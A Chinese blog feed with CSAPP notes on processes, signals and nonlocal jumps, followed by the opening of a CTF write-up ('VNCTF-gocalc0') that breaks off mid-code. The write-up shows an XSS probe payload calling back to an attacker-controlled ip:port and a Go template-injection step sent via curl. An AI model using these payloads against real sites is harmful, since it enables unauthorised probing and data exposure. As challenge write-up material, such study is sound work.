title="检查已回收子进程的退出状态"></a>检查已回收子进程的退出状态</h3><p>如果statusp参数是非空的，那么waitpid就会在status中放上导致子进程返回的状态信息，status是statusp指向的值。</p><ul><li>WIFEXITED(status)：如果子进程通过调用exit或者一个return正常终止，则为真。不管返回的数值为多少</li><li>WEXITSTATUS(status)：返回一个正常终止子进程的退出状态，只有在WIFEXITED()返回为真时，才会定义该状态。</li><li>WIFSIGNALED(status)：如果子进程是因为一个未被捕获的信号终止的，则返回真。</li><li>WTERMSIG(status)：返回导致子进程终止的信号编号，只有WIFSIGNALED(status)返回为真时才会定义该状态。</li><li>WIFSTOPPED(status)：如果引起返回的子进程(比如return语句返回)当前是停止的，则返回真。该检查应该只用在存在<code>WUNTRACED</code>选项的<code>waitpid()</code>函数下。</li><li>WSTOPSIG(status)：返回引起子进程停止的信号编号。只有在WIFSTOPPED(status)返回为真时才会定义这个状态。</li><li>WIFCONTINUED(status)：如果子进程收到SIGCONT信号重新启动则返回真。</li></ul><h3 id="错误条件"><a href="#错误条件" class="headerlink" title="错误条件"></a>错误条件</h3><p>如果调用进程没有子进程，那么waitpid会返回-1，并且设置errno全局变量为ECHILD。如果waitpid函数被一个信号中断，那么它返回-1，并设置errno为EINTR。</p><h2 id="加载并运行程序-execve"><a href="#加载并运行程序-execve" class="headerlink" title="加载并运行程序(execve)"></a>加载并运行程序(execve)</h2><p>execve函数在当前进程的上下文中加载并运行一个新的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *argv[],</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">const</span> <span class="keyword">char</span> *envp[])</span></span>;</span><br><span class="line"><span class="comment">/* 成功不返回，发生错误则返回-1 */</span></span><br></pre></td></tr></table></figure><p>execve函数在运行时可以带上参数列表<code>argv</code>和环境变量列表<code>envp</code>。<br>agrv和envp的结构如下所示：<br><img src="https://s2.loli.net/2022/02/18/E7SgQuBipNRomXF.png" alt="image.png"><br>argv指向一个以NULL结尾的指针数组，其中的每个指针均指向一个参数字符串。根据规则，argv[0]是可执行目标文件的文件名。envp指向的是一个环境变量的列表，两者结构类似，后者为环境变量字符串，由”name=value”对组成。<br><code>char *getenv(const char *name)</code>根据name搜索环境变量，如果找到了则返回执行value的指针，否则返回NULL。<br><code>int setenv(const char *name, const char *newvalue, int overwrite)</code>在overwrite非零时会用newvalue替换掉oldvalue。如果name不存在那么就会将”name=value”添加到数组中。<br><code>void unsetenv(const char *name)</code>将环境数组中的该环境变量删除，系统中的环境变量还存在。<br>libc_start_main系统启动函数初始化执行环境，调用用户层的main函数，处理main函数的返回值，并且在需要的时候将控制转移给内核。<br>execve执行后的进程结构：<br><img src="https://s2.loli.net/2022/02/18/Hh7AEPiXZUIK45G.png" alt="image.png"><br>.text和.data段是由目标程序初始化的，.bss段是匿名文件。</p><h1 id="Signal-信号"><a href="#Signal-信号" class="headerlink" title="Signal(信号)"></a>Signal(信号)</h1><p>正如之前所说，信号是由软件产生并可以在用户进程被处理的ECF机制。接下来会总结一下发送、接收、阻塞和解除阻塞信号的方法，以及编写信号处理程序时需要注意的点，同步流来避免并发错误。<br>Linux中常用的信号：</p><table><thead><tr><th align="center">名称</th><th align="center">默认行为</th><th align="center">相应事件</th></tr></thead><tbody><tr><td align="center">SIGINT</td><td align="center">终止</td><td align="center">键盘发送的中断信号</td></tr><tr><td align="center">SIGKILL</td><td align="center">终止</td><td align="center">杀死程序</td></tr><tr><td align="center">SIGSEGV</td><td align="center">终止并转储内存</td><td align="center">无效的内存引用（段故障）</td></tr><tr><td align="center">SIGCHLD</td><td align="center">忽略</td><td align="center">一个子进程的终止(TER)或停止(STP)</td></tr><tr><td align="center">SIGCONT</td><td align="center">忽略</td><td align="center">如果进程停止则继续执行</td></tr><tr><td align="center">SIGSTP</td><td align="center">停止直到下一个SIGCONT</td><td align="center">来自键盘的停止信号（Ctrl-Z）</td></tr></tbody></table><p><em>在Linux系统下按下Ctrl+C后，内核会将SIGINT信号发送给<strong>前台进程组的每个进程</strong>。<br>待处理信号(pending signal)：一个发出而没有被接收的信号。在任意时刻，一种类型的信号至多有一个待处理信号。其它多余的信号都会被<strong>丢弃</strong>。<br>当信号被阻塞时，它仍可以被发出，但是产生的待处理信号不会被接收，直到目的进程取消对该信号的阻塞。<br>内核为每个进程在</em>pending<em>位向量中维护着待处理信号集合，在</em>blocked*位向量中维护着被阻塞信号的集合。<br>当发送一个类型为k的信号时，内核会设置pending中的第k位，而接收一个类型为k的信号，内核会清除pending中的第k位。这也就导致了待处理信号最多只能被接收一次。</p><h2 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h2><p>内核是通过更新目的进程上下文中的某个状态，来实现向目的进程发送信号这一过程的。<br>发送信号的原因有如下两种：</p><ol><li>内核检测到一个系统事件，如子进程终止。</li><li>一个进程调用了<code>kill</code>函数，显示地要求内核发送一个信号给目的进程。一个进程可以向自己发送信号。</li></ol><h3 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h3><p>进程组这个概念为Unix系统向大量进程发送信号提供了基础。<br>每个进程都<strong>只属于一个进程组</strong>，进程组由一个正整数ID来标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 返回调用进程的进程组ID */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpgrp</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>默认情况下，一个子进程与其父进程同属于一个进程组，孙子进程等也属于该进程组。一个进程可以使用setpgid函数来改变自己或其他进程的进程组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 成功返回0，错误返回-1*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;</span><br></pre></td></tr></table></figure><p><code>setpgid</code>将进程pid的进程组改为pgid。</p><ul><li>pid为0，则使用当前进程的PID。</li><li>pgid是0，那么就用pid指定的进程的PID作为进程组ID。</li></ul><div class="note warning simple"><p>修改进程组ID后不应该与当前上下文冲突，否则会出现权限不允许错误。</p></div><h3 id="发送信号的几种方式"><a href="#发送信号的几种方式" class="headerlink" title="发送信号的几种方式"></a>发送信号的几种方式</h3><h4 id="bin-kill程序发送信号"><a href="#bin-kill程序发送信号" class="headerlink" title="/bin/kill程序发送信号"></a>/bin/kill程序发送信号</h4><p><code>/bin/kill -9 666</code><br>上述命令会向PID=666的进程发送整数9所代表的信号（SIGKILL）。<br>如果PID为负数，那么将会向进程组PID发送信号。比如-666代表向ID为666的进程组中的每个进程发送信号。<br>使用完整路径的原因是有些Unix shell拥有自己内置的kill命令，会被优先执行。</p><h3 id="从键盘发送信号"><a href="#从键盘发送信号" class="headerlink" title="从键盘发送信号"></a>从键盘发送信号</h3><p>Unix shell用作业（job）这个抽象概念来表示为对一个命令行求值而创建的进程。在任何时刻至多只有一个前台作业和0个或多个后台作业。一个作业中可以包含多个进程。<br>shell会为每个作业创建一个独立的进程组，进程组的ID通常取自父进程中的一个。<br>键盘输入Ctrl+C会导致内核发送一个SIGINT信号到<mark class="hl-label red">前台进程组的每个进程</mark> ，默认终止作业。Ctrl+Z会发送一个SIGSTP信号给前台进程组中的每个进程，默认挂起前台作业。</p><h3 id="kill函数发送信号"><a href="#kill函数发送信号" class="headerlink" title="kill函数发送信号"></a>kill函数发送信号</h3><p>进程通过调用kill函数发送信号给其他进程（包括自己）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 成功返回0 错误返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br></pre></td></tr></table></figure><p>几种选择：</p><ul><li>pid大于0，发送信号sig给进程pid。</li><li>pid等于0，发送信号sig给调用进程所在进程组中的每个进程，包括自己。</li><li>pid小于0，发送信号sig给进程组|pid|中的每个进程。</li></ul><h3 id="alarm函数发送信号"><a href="#alarm函数发送信号" class="headerlink" title="alarm函数发送信号"></a>alarm函数发送信号</h3><p>进程可以通过调用alarm函数向自己发送SIGALRM信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"><span class="comment">/* 默认终止调用进程 */</span></span><br></pre></td></tr></table></figure><p>调用该函数后会安排内核在secs秒后发送一个SIGALRM信号给调用进程。如果为0则不会调度安排新的alarm。在任何情况下，对alarm的调用都将取消待处理的闹钟，并返回任何待处理闹钟在被发送前还剩下的秒数(secs参数不为0)；如果没有任何待处理的闹钟，则返回零。</p><h2 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h2><p>当内核将进程p从内核模式切换到用户模式时，它会检查进程p的未被阻塞待处理信号的集合(pending &amp; ~blocked)。如果集合为空则会将控制转递到进程p逻辑控制流中的下一条指令，否则内核会选择集合中的某个信号k(通常是最小的k)，并且强制进程p接收信号k，收到信号后会触发进程采取某种行为。每个信号类型都有一个预定义的默认行为，有下面几种：</p><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程挂起直到被SIGCONT信号重启</li><li>进程忽略该信号</li></ul><p>进程可以通过调用signal函数来修改和信号相关联的默认行为，除了SIGSTOP和SIGKILL信号的默认行为是不可修改的。<br>在fork之后的子进程中会继承父进程的信号处理函数和信号屏蔽字，exec只会继承父进程的信号屏蔽字。</p><div class="note info simple"><p>如果默认行为修改为函数后，还想终止程序则必须在代码中写上相关的语句</p></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* 成功则返回指向前一次处理程序的指针，出错则返回SIG_ERR(不设置errno)*/</span></span></span><br><span class="line"><span class="function"><span class="keyword">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">sighandler_t</span> handler)</span></span>;</span><br></pre></td></tr></table></figure><p>signal可以通过下列三种方法之一来改变和信号signum相关联的行为：</p><ul><li>handler是SIG_IGN，则忽略类型为signum的信号。</li><li>handler是SIG_DFL，那么类型为signum的信号恢复默认行为。</li><li>handler可以是用户定义的函数地址，该函数被称为信号处理程序。当进程捕获一个信号k时，会将处理程序的整数参数设置为k，这样可以使同一个处理程序捕获不同类型的信号。</li></ul><blockquote><p>SIG_IGN和SIG_DFL均为预定义函数</p></blockquote><p>当一个处理程序执行return语句时，控制（通常）传递回控制流中被信号接收中断的位置处。在某些系统中，被中断的系统调用会立即返回一个错误。</p><h2 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h2><ul><li>显示阻塞机制。应用程序可以使用<code>sigprocmask</code>及其辅助函数，明确地阻塞和解除阻塞选定的信号。</li><li>隐式阻塞机制。内核默认阻塞任何当前处理程序正在处理信号类型的待处理信号。比如，处理程序正在处理信号s，那么在处理程序返回前，如果再向该进程发送一个信号s，s会变成待处理信号而不会接收。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 改变当前阻塞的信号集合，具体行为依赖how值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">sigset_t</span> *oldset)</span></span>;</span><br><span class="line"><span class="comment">/* 初始化set为空集合 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="comment">/* 将每个信号都添加到set中 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigfillset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="comment">/* 将signum添加到set中 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaddset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">/* 从set中删除signum 成功返回0 失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigdelset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">/* 如果signum是set中的成员则返回1 不是则返回0 出错返回-1*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigismember</span><span class="params">(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br></pre></td></tr></table></figure>how参数的取值：</li><li>SIG_BLOCK：将set中的信号添加到blocked中(blocked=blocked | set)</li><li>SIG_UNBLOCK：从blocked中删除set的信号(blocked = blocked &amp; ~set)</li><li>SIG_SETMASK：blocked=set，用于恢复阻塞信号集</li></ul><p>如果oldset参数位置不为NULL，那么blocked位向量改变前的值会保存在oldset中。</p><h2 id="编写信号处理程序"><a href="#编写信号处理程序" class="headerlink" title="编写信号处理程序"></a>编写信号处理程序</h2><p>信号处理是很复杂的一个问题，稍微不小心可能就会出现错误。这样的原因有信号处理程序与主程序并发运行共享相同的全局变量，信号处理程序可能被其他信号打断，什么时候接收信号最合适等。这节从安全、正确和可移植三方面来介绍了如何编写信号处理程序。</p><h3 id="安全的信号处理"><a href="#安全的信号处理" class="headerlink" title="安全的信号处理"></a>安全的信号处理</h3><p>这里介绍的是一些保守的编写处理程序的原则，如果忽视这些原则，那么很有可能引入细微的并发错误，而这些错误一旦发生往往是不可预测和不可重复的。</p><ul><li>G0.处理程序要尽可能简单。</li><li>G1.在处理程序中只调用异步信号安全的函数。原因：可重入（如只访问局部变量）；不能被信号处理程序中断。Linux中有保证安全的系统级函数（详细见书籍），要注意的是许多常见的函数如exit和printf等均不在此列。</li><li>G2.保存和恢复errno。许多Linux异步信号安全的函数在出错返回时会设置errno。在处理程序中调用这样的函数可能会干扰主程序中其他依赖于errno的部分。解决办法是在进入处理程序时把errno存入一个局部变量中，并在处理程序返回前恢复errno。只有<strong>在处理程序返回时</strong>才有此必要，如果处理程序调用_exit终止该进程那么就不需要此步骤。</li><li>G3.阻塞所有的信号，来保护对共享全局数据结构的访问。如果处理程序、主程序和其他处理程序共享一个全局数据结构，那么在访问该数据结构前应该阻塞所有的信号，这样可以保证数据的一致性。</li><li>G4.用<code>volatile</code>限定符来声明全局变量。该限定符的作用是告诉编译器不要缓存该变量，每次都要存内存中读取。</li><li>G5.用<code>sig_atomic_t</code>声明标志。在常见的处理程序中，处理程序会设置全局标志位来记录收到了信号。主程序周期的读这个标志，响应信号，再清除该标志。C提供了sig_atomic_t数据类型，来保证对它的读和写是原子操作，这样就可以避免阻塞信号。<strong>注意</strong>，对原子性的保证只适用于单个的读和写，不适用于需要多条指令flag++和flag=flag+1这样的更新。</li></ul><h3 id="正确的信号处理"><a href="#正确的信号处理" class="headerlink" title="正确的信号处理"></a>正确的信号处理</h3><p>之前已经介绍过了，未处理的信号是不会排队等待的。因为pending位向量中每个信号只占一位，所以每个信号类型最多只能有一个未处理的信号。如果两个类型k的信号发送给一个目的进程，那么只有一个信号会被接收，另一个会被简单地丢弃掉。关键的思想是，如果存在一个未处理的信号，则表明<strong>至少</strong>有一个信号到达了。<br>错误情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数 回收所有子进程</span></span><br><span class="line">...</span><br><span class="line">signal(SIGCHLD, handler1);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// handler1函数</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* 肯定会出错 不建议这么写 */</span></span><br><span class="line">waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 修正后代码 */</span></span><br><span class="line"><span class="keyword">while</span> (waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 回收后的操作</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>上面代码错误的情况是因为认为每次只有一个信号发出，而不是每次至少一个信号发出。前一种情况如果当前处理程序正在处理信号，此时另一个信号到达那么这个信号会加入待处理信号的集合（隐式阻塞），这时又一个相同的信号到达后会被直接的丢弃，也就导致了最后只能回收两个子进程，另一个会变为僵尸进程。<br>解决办法是调用一次信号处理程序应尽可能多的回收子进程</p><h3 id="可移植的信号处理"><a href="#可移植的信号处理" class="headerlink" title="可移植的信号处理"></a>可移植的信号处理</h3><p>不同的Unix系统有不同的信号处理语义。</p><ul><li>signal函数的语义各有不同</li><li>系统调用可以被中断</li><li>…</li></ul><p>Posix标准定义了sigaction函数，可以让用户明确的指定信号处理语义，但是由于其参数设置过为复杂，所以很少使用。更多的是使用一种包装函数<code>Signal</code>。详细介绍见书籍8.5.5</p><h2 id="同步流避免并发错误"><a href="#同步流避免并发错误" class="headerlink" title="同步流避免并发错误"></a>同步流避免并发错误</h2><p>如何编写读写相同存储位置的并发流程序困扰着一代又一代的计算机科学家，流可能交错的数量与指令的数量呈指数关系，这些交错的流有些会产生正确的结果，有的确不会。要解决的基本问题是以某种方式同步并发流，来得到最大的可行的交错的并发流集合，使每个可行的交错得到正确的结果。<br>同步流竞争例子可以参考书籍8.5.6。</p><h2 id="显示地等待信号"><a href="#显示地等待信号" class="headerlink" title="显示地等待信号"></a>显示地等待信号</h2><p>上面的例子都没有显示等待信号的代码部分，也就是程序没有“刻意”地等待一个信号的到来。比如shell创建一个前台作业，在该前台作业结束前，shell必须等待其被SIGCHLD处理程序回收。<br>一个简单的方法是设置一个全局PID变量初始值为0，然后在前台作业结束前循环等待，处理程序回收前台作业后设置全局pid，这时再执行之后的操作。<br>为了避免循环浪费资源，可以使用<code>pause</code>函数让主进程休眠。可是这样会存在一个竞争条件，如果前台作业在while语句之后pause语句之前结束运行并返回一个SIGCHLD信号，主进程会进入一个永远的休眠状态。为了避免这种情况另外一种方法是使用sleep函数，规定进程的休眠时间，但这样很难把握时间的范围，所以就引入了<code>sigsuspend</code>这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigsuspend</span><span class="params">(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *mask)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数暂时用mask替换当前的阻塞集合，然后挂起该进程，直到收到一个信号。该函数等价于下述代码的原子版本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h1 id="Nonlocal-jump-非本地跳转"><a href="#Nonlocal-jump-非本地跳转" class="headerlink" title="Nonlocal jump(非本地跳转)"></a>Nonlocal jump(非本地跳转)</h1><p>C语言提供了一种用户级异常控制流的形式，称为非本地跳转，它将控制直接从一个函数转到另一个函数，而不需要正常的调用-返回序列。非本地跳转是通过setjmp和longjmp函数来提供的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setjmp</span><span class="params">(jmp_buf env)</span></span>; <span class="comment">/* setjmp调用返回0 longjmp掉用返回错误类型值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="keyword">int</span> savesigs)</span></span>;</span><br></pre></td></tr></table></figure><p>setjmp函数在env缓冲区中保存当前调用环境，来供后面的longjmp使用，并返回0。调用环境包括程序计数器、栈指针和通用目的寄存器，其返回值不能赋值给变量，但可以用在switch和条件语句的测试中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">longjmp</span><span class="params">(jmp_buf env, <span class="keyword">int</span> retval)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="keyword">int</span> retval)</span></span>;</span><br></pre></td></tr></table></figure><p>longjmp函数从env缓冲区中恢复调用环境，然后触发一个从最近一次初始化env的setjmp调用的返回，然后<strong>setjmp返回并带有非零的返回值retval</strong>。<br>setjmp函数只被调用一次但返回多次，longjmp函数被调用一次但从不返回。非本地跳转的一个重要应用就是允许一个从深层嵌套的函数中立即返回，这样当发生错误情况时，我们可以使用非本地跳转直接返回到一个普通的本地化错误处理程序，而不需要再费力地解开调用栈。<br>longjmp函数虽然可以直接跳过中间调用的特性，但这样可能出现意外的后果。比如，中间调用创建了很多数据结构，本来应该在函数结束时释放它们却直接的跳过了，这样会产生内存的泄露。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章是对书籍和官方PPT知识点的总结，适合用来复习。如果想系统深入地学习，推荐看官方书籍。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> CSAPP </category>
          
          <category> ECF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程概念 </tag>
            
            <tag> 信号机制 </tag>
            
            <tag> 异常 </tag>
            
            <tag> 条件竞争 </tag>
            
            <tag> 非本地跳转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-gocalc0</title>
      <link href="/2022/02/21/VNCTF-gocalc0/"/>
      <url>/2022/02/21/VNCTF-gocalc0/</url>
      
        <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><img src="https://s2.loli.net/2022/02/21/y8OVRmStGafujQB.png" alt="image.png"><br>提示flag在session中，查看session。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=MTY0NTQ1MDk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN1kySmpOVE0yT1RndFpUa3pOUzAwWVRobUxUZ3haR0l0TTJSbE1UWTRZelJsT0RnMGZRPT18MA98tCAhu-p8jMhdTC59dwpXrTrohp0y-hpxBw5pmI0=</span><br></pre></td></tr></table></figure><p>尝试进行base64解码失败，只能测试一下主界面的计算器了。<br>可疑点是之前输入的内容和结果不会随着刷新而消失，查看session发现长度增长了，那么可能是将结果存储到session中了，可是session没有内容固定的部分而是随着内容变化，所以只能再找其他的点了。<br>在输入框输入JS脚本，发现存在XSS，那就试着反弹一下。<br><code>&lt;img src=http://ip:port&gt;</code><br>然后在自己的本地监听一下，看看能不能收到请求。<br><img src="https://s2.loli.net/2022/02/21/9FBSwrWqXPHvojK.png" alt="image.png"><br>这个只是自己本地XSS，没啥太大用处。<br>输入111后发现只显示111，那确定这个网站存在模板渲染。看题目的名字中有go，那肯定是go的SSTI模板渲染了。</p><h1 id="获取源代码并分析"><a href="#获取源代码并分析" class="headerlink" title="获取源代码并分析"></a>获取源代码并分析</h1><p>可以通过<code>&#123;&#123;.&#125;&#125;</code>获取到当前的作用域。<code>.</code>代表当前作用域的当前对象，类似于Java/c++中的this关键字。<br>保存文件到本地：<code>curl -X POST -d &#39;e=&#123;&#123;.&#125;&#125;&#39; http://76366c79-20e4-42de-88b9-142a07b55668.node4.buuoj.cn:81/ &gt; web</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 